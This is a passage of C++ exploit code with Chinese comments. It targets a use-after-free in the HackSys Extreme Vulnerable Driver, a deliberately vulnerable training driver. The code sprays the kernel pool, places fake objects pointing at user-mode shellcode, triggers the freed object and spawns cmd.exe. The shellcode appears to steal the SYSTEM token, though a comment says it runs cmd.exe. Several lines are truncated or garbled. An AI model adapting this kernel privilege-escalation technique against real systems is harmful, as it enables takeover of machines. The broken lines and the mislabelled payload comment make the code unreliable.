    int seq_n = objects_n - defrag_n;
    std::cout  defrag_handles;  
std::vector seq_handles;
    // 从ntdll.dll中获取NtAllocateReserveObject的地址，它是一个函数指针，用于在系统堆上分配内存
    _NtAllocateReserveObject NtAllocateReserveObject = 
        (_NtAllocateReserveObject)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateReserveObject");
    //如果无法获取NtAllocateReserveObject的地址，则输出错误消息并退出程序
    if (!NtAllocateReserveObject){
        std::cout \n";  
exit(1);  
} //这个条件判断检查是否提供了正确的命令行参数，如果没有，则输出用法信息并退出程序
    int poolAllocs = atoi(argv[1]); //这一行代码将第二个命令行参数转换为整数并将其存储在poolAllocs变量中，以便指定要在内核中创建的对象数量
    char devName[] = "\\\\.\\HackSysExtremeVulnerableDriver"; //声明了一个字符串，用于指定要打开的设备的名称，即HackSysExtremeVulnerableDriver
    DWORD inBuffSize = 1024;
    DWORD bytesRet = 0;
    BYTE* inBuffer = (BYTE*) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, inBuffSize);
    RtlFillMemory(inBuffer, inBuffSize, 'A');
    //分配了一个大小为1024字节的缓冲区，并使用RtlFillMemory函数将其填充为'A', 这个缓冲区将用于向设备发送I / O控制代码（IOCTL）
    std::cout , std::vector> handles = spray_pool(poolAllocs);
    //循环创建内存池中的对象空闲块，通过关闭一些对象的句柄来实现
    std::cout << "Creating " << handles.second.size() << " holes\n";
    for (int i = 0; i < handles.second.size(); i++){
        if (i % 2){
            CloseHandle(handles.second[i]);
            handles.second[i] = NULL;
        }
    }
    std::cout << "Sending IOCTLs\n"; //输出消息，表示正在发送IOCTL代码
    //调用DeviceIoControl函数向设备发送IOCTL代码来分配UAF对象,IOCTL代码是通过定义在HackSysExtremeVulnerableDriver.h中的HACKSYS_EVD_IOCTL_ALLOCATE_UAF_OBJECT宏
    std::cout << "Allocating UAF Object\n";
    BOOL status = DeviceIoControl(dev, HACKSYS_EVD_IOCTL_ALLOCATE_UAF_OBJECT,
                                    inBuffer, inBuffSize,
                                    NULL, 0, &bytesRet, NULL);
    //调用DeviceIoControl函数向设备发送IOCTL代码来告诉设备驱动程序释放已分配的UAF对象
    std::cout << "Freeing UAF Object\n";
    status = DeviceIoControl(dev, HACKSYS_EVD_IOCTL_FREE_UAF_OBJECT,
                                    inBuffer, inBuffSize,
                                    NULL, 0, &bytesRet, NULL);
    // 该 shellcode 会执行一个 cmd.exe 程序
    char payload[] = (
                        "\x60"
                        "\x64\xA1\x24\x01\x00\x00"
                        "\x8B\x40\x50"
                        "\x89\xC1"
                        "\x8B\x98\xF8\x00\x00\x00"
                        "\xBA\x04\x00\x00\x00"
                        "\x8B\x80\xB8\x00\x00\x00"
                        "\x2D\xB8\x00\x00\x00"
                        "\x39\x90\xB4\x00\x00\x00"
                        "\x75\xED"
                        "\x8B\x90\xF8\x00\x00\x00"
                        "\x89\x91\xF8\x00\x00\x00"
                        "\x61"
                        "\x31\xC0"
                        "\xC3"
                        );
    // 1.获取Shellcode的地址并将其复制到虚拟分配的内存区域中
    DWORD payloadSize = sizeof(payload);
    LPVOID payloadAddr = VirtualAlloc(NULL, payloadSize,
                                        MEM_COMMIT | MEM_RESERVE,
                                        PAGE_EXECUTE_READWRITE);
    memcpy(payloadAddr, payload, payloadSize);
    LPVOID payloadAddrPtr = &payloadAddr;
    //VirtualAlloc()函数用于在进程的虚拟地址空间中分配内存，将Shellcode复制到此区域中
    //memcpy()函数用于将Shellcode从其初始位置复制到此区域中
    //payloadAddrPtr指向payloadAddr的地址，可以在后面用于生成Fake Object
    std::cout << "Payload adddress is: " << payloadAddr << '\n';
    // 2.设置Fake Object的结构，以匹配UAF Object的结构
    DWORD totalObjectSize = 0x58;
    BYTE payloadBuffer[0x58] = {0};
    memcpy(payloadBuffer, payloadAddrPtr, 4);
    //totalObjectSize表示Fake Object的大小
    //payloadBuffer用于存储Fake Object的数据
    //memcpy()函数用于将Shellcode地址复制到Fake Object中
    //3.分配Fake Object，并将Fake Object的数据写入到内核中
    std::cout << "Allocating fake objects\n";
    std::cout << "Allocating " << handles.second.size() / 2 << " fake objects\n";
    for (int i = 0; i < handles.second.size() / 2; i++){
        status = DeviceIoControl(dev, HACKSYS_EVD_IOCTL_ALLOCATE_FAKE_OBJECT,
                                    payloadBuffer, totalObjectSize, NULL, 
                                    0, &bytesRet, NULL);
    }
    //DeviceIoControl()函数用于向内核发送IOCTL请求，并将Fake Object的数据写入到内核中
    //这个循环创建了足够的Fake Object，以便在内核中填充UAF Object的位置
    //4.使用之前释放的UAF对象
    std::cout << "Using UAF Object after free\n";
    status = DeviceIoControl(dev, HACKSYS_EVD_IOCTL_USE_UAF_OBJECT,
                                    inBuffer, inBuffSize,
                                    NULL, 0, &bytesRet, NULL);
    //DeviceIoControl()函数用于向内核发送IOCTL请求，以使用UAF Object，并在其中执行Shellcode
    //5.生成新进程并启动shell
    std::cout << "Spawning shell\n";
    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));
    STARTUPINFOA si;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    CreateProcessA("C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
    //CreateProcessA()函数用于创建新进程，并在其中启动命令行
    //6.关闭设备并退出程序
    CloseHandle(dev); //CloseHandle()函数用于关闭设备句柄
    return 0;
}